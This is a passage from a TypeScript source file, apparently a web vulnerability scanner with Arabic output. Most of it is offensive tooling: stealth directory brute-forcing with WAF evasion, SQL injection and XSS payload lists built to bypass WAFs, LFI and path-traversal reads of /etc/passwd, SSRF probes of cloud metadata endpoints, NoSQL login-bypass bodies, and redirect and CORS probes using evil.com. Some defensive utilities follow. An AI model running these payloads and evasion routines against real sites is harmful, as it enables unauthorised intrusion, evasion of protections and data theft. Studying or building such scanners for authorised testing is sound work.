    const { url, wordlist = "" } = args;
    if (!url) return "❌ مطلوب: url";
    const defaultWords = ["admin", "login", "api", "backup", "wp-admin", "wp-login.php", "dashboard", ".env", ".git", "config", "phpmyadmin", "cpanel", "server-status", "robots.txt", "sitemap.xml", ".htaccess", "web.config", "xmlrpc.php", "debug", "test", "staging", "dev", "old", "temp", "uploads"];
    const words = wordlist ? wordlist.split(",").map(w => w.trim()) : defaultWords;
    const baseUrl = url.replace(/\/+$/, "");
    const results: string[] = [`📂 اكتشاف المجلدات: ${baseUrl}\n${"─".repeat(40)}\n🕵️ وضع التخفي مفعّل\n`];
    let found = 0;
    let wafBlocks = 0;
    for (const word of words.slice(0, 30)) {
      try {
        const resp = await stealthFetch(`${baseUrl}/${word}`, { method: "HEAD", redirect: "manual" });
        const status = resp.status;
        const waf = isWafBlocked(resp);
        if (waf.blocked) {
          wafBlocks++;
          results.push(`  🧱 /${word} → محظور بواسطة ${waf.wafName}`);
          if (wafBlocks >= 3) {
            results.push(`\n⚠️ WAF نشط (${waf.wafName})! جاري التبديل لتقنيات التجاوز...`);
            // Try with different path encoding
            const encodedWord = word.split("").map(c => `%${c.charCodeAt(0).toString(16)}`).join("");
            try {
              const bypassResp = await stealthFetch(`${baseUrl}/${encodedWord}`, { method: "GET", redirect: "manual" });
              if (bypassResp.status < 400) { results.push(`  🔓 /${word} → ${bypassResp.status} (تجاوز ناجح عبر URL encoding!)`); found++; }
              await bypassResp.text().catch(() => {});
            } catch {}
          }
          continue;
        }
        if (status === 200) { results.push(`  ✅ /${word} → ${status} (موجود!)`); found++; }
        else if (status >= 300 && status < 400) { results.push(`  ↪️ /${word} → ${status} (إعادة توجيه)`); found++; }
        else if (status === 403) { results.push(`  🔒 /${word} → ${status} (محظور)`); found++; }
        else if (status === 401) { results.push(`  🔐 /${word} → ${status} (يحتاج مصادقة)`); found++; }
      } catch {}
    }
    if (wafBlocks > 0) results.push(`\n🧱 WAF حظر ${wafBlocks} طلب`);
    results.push(`\n📊 النتيجة: وُجد ${found} مسار من ${Math.min(words.length, 30)}`);
    return results.join("\n");
  },

  async sqli_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`💉 اختبار SQL Injection (مع تجاوز WAF)\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    
    // Standard payloads
    const payloads = [
      { name: "Single Quote", payload: "'" },
      { name: "OR 1=1", payload: "' OR '1'='1" },
      { name: "Comment", payload: "' --" },
      { name: "Union Select", payload: "' UNION SELECT NULL--" },
      { name: "Boolean", payload: "' AND '1'='1" },
    ];
    
    // WAF bypass payloads
    const bypassPayloads = [
      { name: "WAF Bypass: Comment Spaces", payload: "'/**/OR/**/1=1--" },
      { name: "WAF Bypass: Double Encoding", payload: "%2527%2520OR%25201%253D1--" },
      { name: "WAF Bypass: Case Mix", payload: "' oR '1'='1" },
      { name: "WAF Bypass: Inline Comment", payload: "' /*!OR*/ '1'='1" },
      { name: "WAF Bypass: Tab Instead Space", payload: "'\tOR\t'1'='1" },
      { name: "WAF Bypass: Null Byte", payload: "%00' OR '1'='1" },
      { name: "WAF Bypass: Unicode", payload: "＇ OR ＇1＇=＇1" },
    ];
    
    let wafDetected = false;
    
    for (const { name, payload } of payloads) {
      try {
        const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?id=" + encodeURIComponent(payload);
        const resp = await stealthFetch(testUrl);
        const body = await resp.text();
        const waf = isWafBlocked(resp, body);
        if (waf.blocked) {
          wafDetected = true;
          results.push(`  🧱 ${name}: محظور بواسطة ${waf.wafName}`);
        } else {
          const suspicious = body.toLowerCase().includes("sql") || body.toLowerCase().includes("syntax") || body.toLowerCase().includes("mysql") || resp.status === 500;
          results.push(`  ${suspicious ? "⚠️" : "✅"} ${name}: ${resp.status} ${suspicious ? "(مشبوه!)" : "(آمن)"}`);
        }
      } catch { results.push(`  ❌ ${name}: فشل`); }
    }
    
    if (wafDetected) {
      results.push(`\n🔓 جاري محاولة تجاوز WAF...\n`);
      for (const { name, payload } of bypassPayloads) {
        try {
          const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?id=" + encodeURIComponent(payload);
          const resp = await stealthFetch(testUrl);
          const body = await resp.text();
          const waf = isWafBlocked(resp, body);
          if (!waf.blocked) {
            const suspicious = body.toLowerCase().includes("sql") || body.toLowerCase().includes("syntax") || body.toLowerCase().includes("mysql") || resp.status === 500;
            results.push(`  ${suspicious ? "⚠️ تجاوز ناجح!" : "✅"} ${name}: ${resp.status} ${suspicious ? "(مشبوه!)" : "(مفلتر)"}`);
          } else {
            results.push(`  🧱 ${name}: لا يزال محظوراً`);
          }
        } catch { results.push(`  ❌ ${name}: فشل`); }
      }
    }
    
    return results.join("\n");
  },

  async xss_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🔥 اختبار XSS (مع تجاوز WAF)\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = [
      { name: "Basic Script", payload: "<script>alert(1)</script>" },
      { name: "IMG Tag", payload: '<img src=x onerror=alert(1)>' },
      { name: "SVG", payload: '<svg onload=alert(1)>' },
      { name: "Event Handler", payload: '" onmouseover="alert(1)"' },
    ];
    
    const bypassPayloads = [
      { name: "WAF Bypass: Case Mix", payload: "<ScRiPt>alert(1)</sCrIpT>" },
      { name: "WAF Bypass: Double Encode", payload: "%253Cscript%253Ealert(1)%253C/script%253E" },
      { name: "WAF Bypass: SVG/onload", payload: "<svg/onload=alert(1)>" },
      { name: "WAF Bypass: Body onload", payload: "<body onload=alert(1)>" },
      { name: "WAF Bypass: IMG with tab", payload: "<img\tsrc=x\tonerror=alert(1)>" },
      { name: "WAF Bypass: JavaScript URI", payload: "javascript:alert(1)//" },
      { name: "WAF Bypass: HTML Entity", payload: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>" },
      { name: "WAF Bypass: Null Byte", payload: "<scr%00ipt>alert(1)</scr%00ipt>" },
    ];
    
    let wafDetected = false;
    
    for (const { name, payload } of payloads) {
      try {
        const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?q=" + encodeURIComponent(payload);
        const resp = await stealthFetch(testUrl);
        const body = await resp.text();
        const waf = isWafBlocked(resp, body);
        if (waf.blocked) {
          wafDetected = true;
          results.push(`  🧱 ${name}: محظور بواسطة ${waf.wafName}`);
        } else {
          const reflected = body.includes(payload);
          results.push(`  ${reflected ? "⚠️" : "✅"} ${name}: ${reflected ? "منعكس!" : "مفلتر"}`);
        }
      } catch { results.push(`  ❌ ${name}: فشل`); }
    }
    
    if (wafDetected) {
      results.push(`\n🔓 جاري محاولة تجاوز WAF...\n`);
      for (const { name, payload } of bypassPayloads) {
        try {
          const testUrl = url.includes("?") ? url + encodeURIComponent(payload) : url + "?q=" + encodeURIComponent(payload);
          const resp = await stealthFetch(testUrl);
          const body = await resp.text();
          const waf = isWafBlocked(resp, body);
          if (!waf.blocked) {
            const reflected = body.includes(payload) || body.includes(decodeURIComponent(payload));
            results.push(`  ${reflected ? "⚠️ تجاوز ناجح!" : "✅"} ${name}: ${reflected ? "منعكس!" : "مفلتر"}`);
          } else {
            results.push(`  🧱 ${name}: لا يزال محظوراً`);
          }
        } catch { results.push(`  ❌ ${name}: فشل`); }
      }
    }
    
    try {
      const resp = await stealthFetch(url, { method: "HEAD" });
      results.push(`\n🛡️ حماية:`);
      results.push(`  ${resp.headers.get("content-security-policy") ? "✅" : "❌"} CSP`);
      results.push(`  ${resp.headers.get("x-xss-protection") ? "✅" : "❌"} X-XSS-Protection`);
    } catch {}
    return results.join("\n");
  },

  async subdomain_enum(args) {
    const { domain } = args;
    if (!domain) return "❌ مطلوب: domain";
    const results: string[] = [`🌳 تعداد النطاقات الفرعية: ${domain}\n${"─".repeat(40)}\n`];
    const subs = ["www","mail","ftp","admin","blog","dev","staging","test","api","app","cdn","cloud","cpanel","dashboard","db","demo","docs","forum","git","help","img","login","m","media","monitor","mx","ns1","ns2","portal","proxy","remote","search","shop","smtp","ssl","static","store","support","vpn","webmail","wiki"];
    let found = 0;
    for (const sub of subs) {
      try { const r = await Deno.resolveDns(`${sub}.${domain}`, "A"); if (r.length > 0) { results.push(`  ✅ ${sub}.${domain} → ${r.join(", ")}`); found++; } } catch {}
    }
    results.push(`\n📊 وُجد ${found} نطاق فرعي من ${subs.length}`);
    return results.join("\n");
  },

  async cors_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🚧 اختبار CORS: ${url}\n${"─".repeat(40)}\n`];
    const origins = ["https://evil.com", "null", "https://attacker.com"];
    for (const origin of origins) {
      try {
        const resp = await fetch(url, { headers: { "Origin": origin } });
        await resp.text();
        const acao = resp.headers.get("access-control-allow-origin");
        const acac = resp.headers.get("access-control-allow-credentials");
        if (acao) {
          const dangerous = acao === "*" || acao === origin;
          results.push(`  ${dangerous ? "⚠️" : "✅"} Origin "${origin}" → ACAO: ${acao}${acac === "true" && dangerous ? " 🔴 خطير!" : ""}`);
        } else { results.push(`  ✅ Origin "${origin}" → لا ACAO (آمن)`); }
      } catch { results.push(`  ❌ فشل مع: ${origin}`); }
    }
    return results.join("\n");
  },

  async open_redirect(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`↪️ اختبار Open Redirect\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n`];
    const payloads = ["https://evil.com", "//evil.com", "/\\evil.com", "https://evil.com%00.target.com"];
    for (const payload of payloads) {
      try {
        const testUrl = url + encodeURIComponent(payload);
        const resp = await fetch(testUrl, { redirect: "manual" });
        const location = resp.headers.get("location") || "";
        if (resp.status >= 300 && resp.status < 400 && location.includes("evil")) {
          results.push(`  ⚠️ ${payload} → ${resp.status} Location: ${location.substring(0, 80)}`);
        } else { results.push(`  ✅ ${payload} → ${resp.status} (آمن)`); }
      } catch { results.push(`  ❌ ${payload}: فشل`); }
    }
    return results.join("\n");
  },

  // --- NEW OFFENSIVE TOOLS ---

  async lfi_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`📁 اختبار LFI\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd%00", "..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\etc\\passwd"];
    for (const payload of payloads) {
      try {
        const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : url + "?file=" + encodeURIComponent(payload);
        const resp = await fetch(testUrl, { redirect: "follow" });
        const body = await resp.text();
        const vulnerable = body.includes("root:") || body.includes("/bin/bash") || body.includes("/bin/sh");
        results.push(`  ${vulnerable ? "⚠️ محتمل!" : "✅ آمن"} ${payload.substring(0, 30)} → ${resp.status}`);
      } catch { results.push(`  ❌ ${payload.substring(0, 30)}: فشل`); }
    }
    return results.join("\n");
  },

  async rfi_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🌍 اختبار RFI\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = ["https://httpbin.org/get", "//httpbin.org/get", "https://example.com"];
    for (const payload of payloads) {
      try {
        const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : url + "?file=" + encodeURIComponent(payload);
        const resp = await fetch(testUrl, { redirect: "follow" });
        const body = await resp.text();
        const vulnerable = body.includes("httpbin") || body.includes("origin");
        results.push(`  ${vulnerable ? "⚠️ محتمل!" : "✅ آمن"} ${payload} → ${resp.status}`);
      } catch { results.push(`  ❌ ${payload}: فشل`); }
    }
    return results.join("\n");
  },

  async ssrf_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🔀 اختبار SSRF\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = ["http://127.0.0.1", "http://localhost", "http://169.254.169.254/latest/meta-data/", "http://[::1]", "http://0x7f000001"];
    for (const payload of payloads) {
      try {
        const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : url + "?url=" + encodeURIComponent(payload);
        const resp = await fetch(testUrl, { redirect: "follow" });
        const body = await resp.text();
        const suspicious = body.includes("ami-id") || body.includes("instance-id") || body.length > 0 && resp.status === 200;
        results.push(`  ${suspicious ? "⚠️" : "✅"} ${payload} → ${resp.status}`);
      } catch { results.push(`  ❌ ${payload}: فشل/محظور`); }
    }
    return results.join("\n");
  },

  async crlf_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`⏎ اختبار CRLF Injection\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n`];
    const payloads = ["%0d%0aX-Injected:true", "%0aX-Injected:true", "%0d%0a%0d%0a<script>alert(1)</script>", "\\r\\nX-Injected:true"];
    for (const payload of payloads) {
      try {
        const testUrl = url + payload;
        const resp = await fetch(testUrl, { redirect: "manual" });
        await resp.text();
        const injected = resp.headers.get("x-injected");
        results.push(`  ${injected ? "⚠️ محتمل!" : "✅ آمن"} ${payload.substring(0, 30)} → ${resp.status}`);
      } catch { results.push(`  ❌ ${payload.substring(0, 30)}: فشل`); }
    }
    return results.join("\n");
  },

  async clickjacking_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🖱️ اختبار Clickjacking\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n`];
    try {
      const resp = await fetch(url, { method: "HEAD", redirect: "follow" });
      const xfo = resp.headers.get("x-frame-options");
      const csp = resp.headers.get("content-security-policy");
      results.push(`🛡️ X-Frame-Options: ${xfo || "❌ غير موجود"}`);
      results.push(`🛡️ CSP frame-ancestors: ${csp?.includes("frame-ancestors") ? "✅ موجود" : "❌ غير موجود"}`);
      if (!xfo && !csp?.includes("frame-ancestors")) {
        results.push(`\n⚠️ الموقع قد يكون عرضة لـ Clickjacking!`);
      } else { results.push(`\n✅ الموقع محمي من Clickjacking`); }
    } catch (e) { results.push(`❌ خطأ: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async host_header_injection(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🏷️ اختبار Host Header Injection\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n`];
    const hosts = ["evil.com", "localhost", "127.0.0.1"];
    for (const host of hosts) {
      try {
        const resp = await fetch(url, { headers: { "Host": host, "X-Forwarded-Host": host } });
        const body = await resp.text();
        const reflected = body.includes(host);
        results.push(`  ${reflected ? "⚠️ منعكس!" : "✅ آمن"} Host: ${host} → ${resp.status}`);
      } catch { results.push(`  ❌ Host: ${host} - فشل`); }
    }
    return results.join("\n");
  },

  async http_methods_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`📮 اختبار HTTP Methods\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n`];
    const methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE"];
    for (const method of methods) {
      try {
        const resp = await fetch(url, { method, redirect: "manual" });
        await resp.text();
        const dangerous = ["PUT", "DELETE", "TRACE", "PATCH"].includes(method) && resp.status < 400;
        results.push(`  ${dangerous ? "⚠️" : "✅"} ${method}: ${resp.status} ${resp.statusText}`);
      } catch { results.push(`  ❌ ${method}: فشل`); }
    }
    return results.join("\n");
  },

  async param_discovery(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🔎 اكتشاف المعاملات\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n`];
    const params = ["id", "page", "q", "search", "query", "user", "name", "email", "file", "path", "url", "redirect", "next", "callback", "token", "key", "action", "type", "cat", "category", "lang", "debug", "test", "admin", "format", "view"];
    let found = 0;
    const baseResp = await fetch(url).catch(() => null);
    const baseLen = baseResp ? (await baseResp.text()).length : 0;
    for (const param of params) {
      try {
        const testUrl = `${url}${url.includes("?") ? "&" : "?"}${param}=test123`;
        const resp = await fetch(testUrl, { redirect: "follow" });
        const body = await resp.text();
        if (body.includes("test123") || Math.abs(body.length - baseLen) > 50) {
          results.push(`  🔍 ${param} → ${resp.status} (استجابة مختلفة)`); found++;
        }
      } catch {}
    }
    results.push(`\n📊 وُجد ${found} معامل محتمل من ${params.length}`);
    return results.join("\n");
  },

  async path_traversal(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`📂 اختبار Path Traversal\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = ["../../../etc/passwd", "..%252f..%252f..%252fetc%252fpasswd", "....//....//etc/passwd", "..%c0%afetc%c0%afpasswd", "%2e%2e/%2e%2e/%2e%2e/etc/passwd"];
    for (const payload of payloads) {
      try {
        const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : url + "?name=" + encodeURIComponent(payload);
        const resp = await fetch(testUrl, { redirect: "follow" });
        const body = await resp.text();
        const vulnerable = body.includes("root:") || body.includes("/bin/");
        results.push(`  ${vulnerable ? "⚠️ محتمل!" : "✅ آمن"} ${payload.substring(0, 30)} → ${resp.status}`);
      } catch { results.push(`  ❌ ${payload.substring(0, 30)}: فشل`); }
    }
    return results.join("\n");
  },

  async ssti_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🧩 اختبار SSTI\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = [
      { name: "Jinja2/Twig", payload: "{{7*7}}", expect: "49" },
      { name: "Mako", payload: "${7*7}", expect: "49" },
      { name: "FreeMarker", payload: "${7*7}", expect: "49" },
      { name: "ERB", payload: "<%=7*7%>", expect: "49" },
    ];
    for (const { name, payload, expect } of payloads) {
      try {
        const testUrl = url.includes("?") ? url.replace(/=([^&]*)/, `=${encodeURIComponent(payload)}`) : url + "?name=" + encodeURIComponent(payload);
        const resp = await fetch(testUrl, { redirect: "follow" });
        const body = await resp.text();
        const vulnerable = body.includes(expect);
        results.push(`  ${vulnerable ? "⚠️ محتمل!" : "✅ آمن"} ${name}: ${payload} → ${vulnerable ? "تم تنفيذه!" : "لم ينفذ"}`);
      } catch { results.push(`  ❌ ${name}: فشل`); }
    }
    return results.join("\n");
  },

  async xxe_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`📄 اختبار XXE\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe "XXE_TEST_STRING">]><root><data>&xxe;</data></root>`;
    try {
      const resp = await fetch(url, { method: "POST", headers: { "Content-Type": "application/xml" }, body: xxePayload });
      const body = await resp.text();
      const vulnerable = body.includes("XXE_TEST_STRING");
      results.push(`  ${vulnerable ? "⚠️ XXE محتمل!" : "✅ آمن"} → ${resp.status}`);
      results.push(`  Content-Type استجابة: ${resp.headers.get("content-type") || "غير محدد"}`);
    } catch (e) { results.push(`  ❌ فشل: ${e instanceof Error ? e.message : "خطأ"}`); }
    return results.join("\n");
  },

  async nosql_test(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const results: string[] = [`🗄️ اختبار NoSQL Injection\n${"─".repeat(40)}\n🔗 الهدف: ${url}\n⚠️ اختبار أخلاقي فقط!\n`];
    const payloads = [
      { name: "Always true", body: '{"username":{"$gt":""},"password":{"$gt":""}}' },
      { name: "Regex", body: '{"username":{"$regex":".*"},"password":{"$regex":".*"}}' },
      { name: "Not equal", body: '{"username":{"$ne":""},"password":{"$ne":""}}' },
    ];
    for (const { name, body } of payloads) {
      try {
        const resp = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body });
        const respBody = await resp.text();
        const suspicious = resp.status === 200 && (respBody.includes("token") || respBody.includes("session") || respBody.includes("success"));
        results.push(`  ${suspicious ? "⚠️ مشبوه!" : "✅"} ${name}: ${resp.status}`);
      } catch { results.push(`  ❌ ${name}: فشل`); }
    }
    return results.join("\n");
  },

  async api_fuzzer(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    const base = url.replace(/\/+$/, "");
    const results: string[] = [`🎯 فحص API: ${base}\n${"─".repeat(40)}\n`];
    const endpoints = ["/api", "/api/v1", "/api/v2", "/api/users", "/api/admin", "/api/login", "/api/auth", "/api/config", "/api/health", "/api/status", "/api/docs", "/api/swagger", "/swagger.json", "/openapi.json", "/graphql", "/api/graphql", "/api/debug", "/api/test", "/api/info", "/api/version"];
    let found = 0;
    for (const ep of endpoints) {
      try {
        const resp = await fetch(`${base}${ep}`, { method: "GET", redirect: "manual" });
        await resp.text();
        if (resp.status < 404) { results.push(`  ${resp.status < 400 ? "✅" : "🔒"} ${ep} → ${resp.status}`); found++; }
      } catch {}
    }
    results.push(`\n📊 وُجد ${found} نقطة نهاية من ${endpoints.length}`);
    return results.join("\n");
  },

  async subdomain_takeover(args) {
    const { domain } = args;
    if (!domain) return "❌ مطلوب: domain";
    const results: string[] = [`🏴 فحص Subdomain Takeover: ${domain}\n${"─".repeat(40)}\n`];
    const subs = ["blog", "dev", "staging", "test", "cdn", "api", "app", "mail", "shop", "store", "docs", "help", "support", "status", "demo"];
    let vulnerable = 0;
    for (const sub of subs) {
      const fqdn = `${sub}.${domain}`;
      try {
        const records = await Deno.resolveDns(fqdn, "CNAME");
        if (records.length > 0) {
          const cname = records[0];
          // Check if CNAME target resolves
          try { await Deno.resolveDns(cname, "A"); results.push(`  ✅ ${fqdn} → ${cname} (يعمل)`); }
          catch { results.push(`  ⚠️ ${fqdn} → ${cname} (CNAME لا يحل! محتمل takeover)`); vulnerable++; }
        }
      } catch {}
    }
    results.push(`\n📊 ${vulnerable > 0 ? `⚠️ ${vulnerable} نطاق محتمل للاستيلاء!` : "✅ لا توجد نقاط ضعف"}`);
    return results.join("\n");
  },

  // ===== DEFENSIVE TOOLS =====

  async hash(args) {
    const { text, algorithm = "SHA-256" } = args;
    if (!text) return "❌ مطلوب: text";
    const results: string[] = [`🔐 تجزئة النص\n${"─".repeat(40)}\n`];
    const algos = algorithm.toUpperCase() === "ALL" ? ["SHA-1", "SHA-256", "SHA-384", "SHA-512"] : [algorithm.toUpperCase()];
    for (const algo of algos) {
      try { const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(text)); results.push(`  🔑 ${algo}: ${Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,"0")).join("")}`); } catch { results.push(`  ❌ ${algo}: غير مدعوم`); }
    }
    return results.join("\n");
  },

  async password_strength(args) {
    const { password } = args;
    if (!password) return "❌ مطلوب: password";
    const results: string[] = [`🔑 تحليل كلمة المرور\n${"─".repeat(40)}`];
    let score = 0;
    const checks = [
      { label: "الطول ≥ 8", pass: password.length >= 8 }, { label: "الطول ≥ 12", pass: password.length >= 12 },
      { label: "أحرف كبيرة", pass: /[A-Z]/.test(password) }, { label: "أحرف صغيرة", pass: /[a-z]/.test(password) },
      { label: "أرقام", pass: /[0-9]/.test(password) }, { label: "رموز", pass: /[^A-Za-z0-9]/.test(password) },
    ];
    for (const c of checks) { results.push(`  ${c.pass ? "✅" : "❌"} ${c.label}`); if (c.pass) score++; }
    let strength = "ضعيفة 🔴"; if (score >= 5) strength = "قوية جداً 🟢"; else if (score >= 4) strength = "قوية 🟡"; else if (score >= 3) strength = "متوسطة 🟠";
    results.push(`\n💪 القوة: ${strength} (${score}/${checks.length})`);
    return results.join("\n");
  },

  async generate_password(args) {
    const { length = "16", count = "5" } = args;
    const len = Math.min(Math.max(parseInt(length)||16, 8), 128);
    const cnt = Math.min(parseInt(count)||5, 10);
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=";
    const results: string[] = [`🔐 مولّد كلمات مرور (طول: ${len})\n${"─".repeat(40)}\n`];
    for (let i = 0; i < cnt; i++) { const b = new Uint8Array(len); crypto.getRandomValues(b); results.push(`  ${i+1}. ${Array.from(b).map(x => charset[x % charset.length]).join("")}`); }
    return results.join("\n");
  },

  async base64(args) {
    const { text, mode = "encode" } = args;
    if (!text) return "❌ مطلوب: text";
    if (mode === "decode") { try { return `🔓 Base64 Decode:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${new TextDecoder().decode(base64Decode(text))}`; } catch { return "❌ Base64 غير صالح"; } }
    return `🔒 Base64 Encode:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${base64Encode(new TextEncoder().encode(text))}`;
  },

  async jwt_decode(args) {
    const { token } = args;
    if (!token) return "❌ مطلوب: token";
    try {
      const parts = token.split("."); if (parts.length !== 3) return "❌ JWT غير صالح";
      const fix = (s: string) => s.replace(/-/g, "+").replace(/_/g, "/") + "==";
      const header = JSON.parse(new TextDecoder().decode(base64Decode(fix(parts[0]))));
      const payload = JSON.parse(new TextDecoder().decode(base64Decode(fix(parts[1]))));
      const results = [`🔓 JWT Decoder\n${"─".repeat(40)}\n📋 Header:\n${JSON.stringify(header,null,2)}\n\n📦 Payload:\n${JSON.stringify(payload,null,2)}`];
      if (payload.exp) { const d = new Date(payload.exp*1000); results.push(`\n⏰ انتهاء: ${d.toISOString()} ${d < new Date() ? "❌ منتهي" : "✅ صالح"}`); }
      return results.join("\n");
    } catch { return "❌ فشل فك JWT"; }
  },

  async url_encode(args) {
    const { text, mode = "encode" } = args;
    if (!text) return "❌ مطلوب: text";
    return mode === "decode" ? `🔓 URL Decode:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${decodeURIComponent(text)}` : `🔒 URL Encode:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${encodeURIComponent(text)}`;
  },

  async hash_identify(args) {
    const { hash } = args;
    if (!hash) return "❌ مطلوب: hash";
    const results: string[] = [`🔎 تحديد نوع Hash\n${"─".repeat(40)}\n📥 ${hash}\n📏 الطول: ${hash.length}\n`];
    const types = [
      { name: "MD5", len: 32, pattern: /^[a-f0-9]{32}$/i }, { name: "SHA-1", len: 40, pattern: /^[a-f0-9]{40}$/i },
      { name: "SHA-256", len: 64, pattern: /^[a-f0-9]{64}$/i }, { name: "SHA-512", len: 128, pattern: /^[a-f0-9]{128}$/i },
      { name: "bcrypt", len: 60, pattern: /^\$2[aby]?\$\d{2}\$/ }, { name: "CRC32", len: 8, pattern: /^[a-f0-9]{8}$/i },
    ];
    const matches = types.filter(t => t.pattern.test(hash));
    if (matches.length > 0) { results.push(`🎯 أنواع محتملة:`); matches.forEach(m => results.push(`  → ${m.name}`)); }
    else results.push(`❌ نوع غير معروف`);
    return results.join("\n");
  },

  async csp_generator(args) {
    const { url } = args;
    if (!url) return "❌ مطلوب: url";
    try {
      const resp = await fetch(url);
      const html = await resp.text();
      const results: string[] = [`🏗️ مولّد CSP: ${url}\n${"─".repeat(40)}\n`];
      const existingCsp = resp.headers.get("content-security-policy");
      results.push(existingCsp ? `📋 CSP الحالي: ${existingCsp.substring(0, 200)}` : `❌ لا يوجد CSP حالي`);
      const domains = new Set<string>();
      const srcMatches = html.matchAll(/(?:src|href)=["']https?:\/\/([^/"']+)/g);
      for (const m of srcMatches) domains.add(m[1]);
      const csp = [`default-src 'self'`, `script-src 'self'`, `style-src 'self' 'unsafe-inline'`, `img-src 'self' data: https:`, `font-src 'self' https:`, `connect-src 'self'`, `frame-ancestors 'none'`, `base-uri 'self'`];
      results.push(`\n🛡️ CSP المقترح:\n`);
      csp.forEach(d => results.push(`  ${d};`));
      return results.join("\n");
    } catch (e) { return `❌ فشل: ${e instanceof Error ? e.message : "خطأ"}`; }
  },

  async hex_converter(args) {
    const { text, mode = "to_hex" } = args;
    if (!text) return "❌ مطلوب: text";
    if (mode === "from_hex") {
      try { const decoded = text.match(/.{1,2}/g)?.map(b => String.fromCharCode(parseInt(b, 16))).join("") || ""; return `🔠 Hex → Text:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${decoded}`; } catch { return "❌ Hex غير صالح"; }
    }
    const hex = Array.from(new TextEncoder().encode(text)).map(b => b.toString(16).padStart(2, "0")).join(" ");
    return `🔠 Text → Hex:\n${"─".repeat(40)}\n📥 ${text}\n📤 ${hex}`;
  },

  async timestamp_convert(args) {
    const { value } = args;
    if (!value) return "❌ مطلوب: value";
    const results: string[] = [`⏰ محوّل التوقيت\n${"─".repeat(40)}`];
    const num = parseInt(value);
    if (!isNaN(num) && num > 1000000000) {
      const d = new Date(num * (num > 1e12 ? 1 : 1000));
      results.push(`\n📥 Unix: ${value}\n📤 UTC: ${d.toUTCString()}\n📤 ISO: ${d.toISOString()}`);
    } else {
      const d = new Date(value);
      if (!isNaN(d.getTime())) { results.push(`\n📥 التاريخ: ${value}\n📤 Unix: ${Math.floor(d.getTime()/1000)}\n📤 ISO: ${d.toISOString()}`); }
      else results.push(`\n❌ قيمة غير صالحة`);
    }
    results.push(`\n🕐 الآن: ${Math.floor(Date.now()/1000)}`);
    return results.join("\n");
  },

  // --- NEW DEFENSIVE TOOLS ---

  async ip_converter(args) {
    const { ip } = args;
    if (!ip) return "❌ مطلوب: ip";
    const results: string[] = [`🔄 محوّل IP: ${ip}\n${"─".repeat(40)}`];
    const parts = ip.split(".").map(Number);
    if (parts.length === 4 && parts.every(p => p >= 0 && p <= 255)) {
      const decimal = (parts[0] << 24 | parts[1] << 16 | parts[2] << 8 | parts[3]) >>> 0;
